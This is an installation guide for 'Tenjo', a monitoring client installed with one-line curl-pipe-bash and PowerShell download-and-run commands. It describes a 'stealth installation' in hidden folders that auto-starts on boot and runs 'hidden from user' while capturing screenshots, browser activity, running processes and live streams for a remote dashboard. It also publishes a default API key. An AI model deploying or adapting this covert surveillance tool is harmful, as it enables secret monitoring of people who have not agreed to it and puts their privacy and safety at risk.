# Tenjo Remote Installation Guide

## 🚀 Quick Remote Installation

### macOS - One-Line Installation
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh | bash
```

### Windows - One-Line Installation
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile '%TEMP%\install.bat' -UseBasicParsing; cmd /c '%TEMP%\install.bat'; del '%TEMP%\install.bat'"
```

## 🔧 Custom Server Installation

If you want to use a different server URL, download and modify the script first:

### macOS Custom Installation
```bash
# Download script
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh -o install.sh

# Edit SERVER_URL in the script
nano install.sh
# Change: SERVER_URL="http://127.0.0.1:8000"
# To:     SERVER_URL="http://your-server.com:8000"

# Run installation
chmod +x install.sh
./install.sh
```

### Windows Custom Installation
```cmd
# Download script
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile 'install.bat' -UseBasicParsing"

# Edit SERVER_URL in the script
notepad install.bat
REM Change: set "SERVER_URL=http://127.0.0.1:8000"
REM To:     set "SERVER_URL=http://your-server.com:8000"

# Run installation
install.bat
```

## 🗑️ Quick Remote Uninstallation

### macOS - One-Line Uninstall
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_macos.sh | bash
```

### Windows - One-Line Uninstall
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%TEMP%\uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\uninstall.bat'; del '%TEMP%\uninstall.bat'"
```

## ✨ What the Remote Installer Does

### Automatic Download & Setup:
1. ✅ Downloads all source files from GitHub
2. ✅ Creates Python virtual environment
3. ✅ Installs all required dependencies
4. ✅ Sets up stealth installation in `~/.tenjo` (hidden folder)
5. ✅ Configures auto-start service
6. ✅ Starts monitoring immediately

### Files Downloaded:
- `main.py` - Main application entry point
- `src/core/config.py` - Configuration settings
- `src/modules/screen_capture.py` - Screenshot functionality
- `src/modules/process_monitor.py` - Process monitoring
- `src/modules/browser_monitor.py` - Browser activity tracking
- `src/modules/stream_handler.py` - Live streaming
- `src/utils/api_client.py` - Server communication
- `src/utils/stealth.py` - Stealth mode utilities

## 📍 Installation Locations

- **macOS**: `~/.tenjo/` (hidden folder in home directory)
- **Windows**: `%USERPROFILE%\.tenjo\` (hidden folder in user profile)

## 🔑 Default Configuration

- **Server URL**: `http://127.0.0.1:8000` (change this for production)
- **API Key**: `tenjo-api-key-2024`
- **Auto-start**: Enabled (starts on system boot)
- **Stealth Mode**: Enabled (hidden from user)

## ⚠️ Requirements

### macOS:
- macOS 10.15+ (Catalina or newer)
- Internet connection
- User privileges (no root required)

### Windows:
- Windows 10 or newer
- Python 3.8+ (installer will prompt if missing)
- Administrator privileges
- Internet connection

## 🔍 Verification

After installation, you can verify the client is running:

### macOS:
```bash
# Check if process is running
ps aux | grep python | grep main.py

# Check client info
~/.tenjo/.venv/bin/python -c "import sys; sys.path.append('~/.tenjo/src'); from core.config import Config; print(f'Client ID: {Config.CLIENT_ID}')"
```

### Windows:
```cmd
# Check if process is running
tasklist | findstr python

# Check client info
%USERPROFILE%\.tenjo\.venv\Scripts\python -c "import sys; sys.path.append('%USERPROFILE%\.tenjo\src'); from core.config import Config; print(f'Client ID: {Config.CLIENT_ID}')"
```

## 🛡️ Security Notes

- Install scripts download files over HTTPS
- All files are stored in hidden user directories
- No system-wide changes required
- Can be completely removed with uninstaller

## 📊 Dashboard Access

After installation, access the monitoring dashboard at:
- Local development: `http://127.0.0.1:8000`
- Production: `http://your-server.com:8000`

## 🆘 Troubleshooting

### Installation Failed:
1. Check internet connection
2. Verify Python is installed (Windows)
3. Check permissions
4. Review error messages in terminal

### Client Not Running:
1. Check logs: `~/.tenjo/logs/` (macOS) or `%USERPROFILE%\.tenjo\logs\` (Windows)
2. Manually start: Run main.py from installation directory
3. Check server connectivity

### Uninstall Issues:
1. Manually kill processes: `pkill -f python` (macOS) or `taskkill /f /im python.exe` (Windows)
2. Remove directory: `rm -rf ~/.tenjo` (macOS) or `rmdir /s %USERPROFILE%\.tenjo` (Windows)
3. Remove service: Check system services/launchctl
